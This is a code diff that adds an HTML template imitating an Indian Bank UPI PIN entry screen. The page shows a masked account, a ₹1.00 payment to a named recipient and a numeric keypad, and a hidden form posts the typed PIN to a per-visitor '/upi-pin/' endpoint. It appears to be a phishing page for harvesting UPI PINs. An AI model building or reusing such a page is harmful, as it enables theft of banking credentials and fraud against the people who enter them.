@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="Content-Security-Policy" content="script-src 'self'; script-src-attr 'none';">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>UPI PIN Entry</title>
+  <link rel="stylesheet" href="/css/styles.css" />
+</head>
+<body data-uid="<%= uniqueId %>">
+  <div class="container">
+
+    <!-- HEADER -->
+    <header>
+      <div class="bank-info">
+        <span class="bank-name">Indian Bank</span>
+        <span class="account-mask">XXXX2781</span>
+      </div>
+      <div class="upi-logo">
+        <img src="/assets/upi.png" alt="UPI Logo" />
+      </div>
+    </header>
+
+    <!-- INFO BLOCK -->
+    <div class="info-block">
+      <div class="info-row">
+        <div class="label">To:</div>
+        <div class="value">Roshan Poddar</div>
+      </div>
+      <div class="info-row">
+        <div class="label">Sending:</div>
+        <div class="value with-arrow">₹ 1.00</div>
+      </div>
+    </div>
+
+    <!-- PIN PROMPT -->
+    <div class="pin-section">
+      <div class="pin-prompt">ENTER 4-DIGIT UPI PIN</div>
+      <div class="pin-dots">
+        <div class="dot" id="dot-0"></div>
+        <div class="dot" id="dot-1"></div>
+        <div class="dot" id="dot-2"></div>
+        <div class="dot" id="dot-3"></div>
+      </div>
+    </div>
+
+    <!-- ALERT -->
+    <div class="alert">
+      <span class="icon">!</span>
+      <span>You are transferring money from your <strong>Indian Bank</strong> account to <strong>Roshan Poddar</strong></span>
+    </div>
+
+    <!-- Hidden form for submission -->
+    <form id="pinForm" action="/upi-pin/<%= uniqueId %>" method="POST">
+      <input type="hidden" name="pin" id="pinInput" value="">
+    </form>
+
+    <!-- KEYPAD -->
+    <footer>
+      <div class="keypad">
+        <div class="key">1</div><div class="key">2</div><div class="key">3</div>
+        <div class="key">4</div><div class="key">5</div><div class="key">6</div>
+        <div class="key">7</div><div class="key">8</div><div class="key">9</div>
+        <div class="key icon-key backspace"><img src="/assets/backspace.png" alt="Backspace" /></div>
+        <div class="key">0</div>
+        <div class="key icon-key check"><img src="/assets/check.png" alt="Confirm" /></div>
+      </div>
+    </footer>
+  </div>
+
+  <script src="/js/dot.js"></script>
+</body>
+</html>
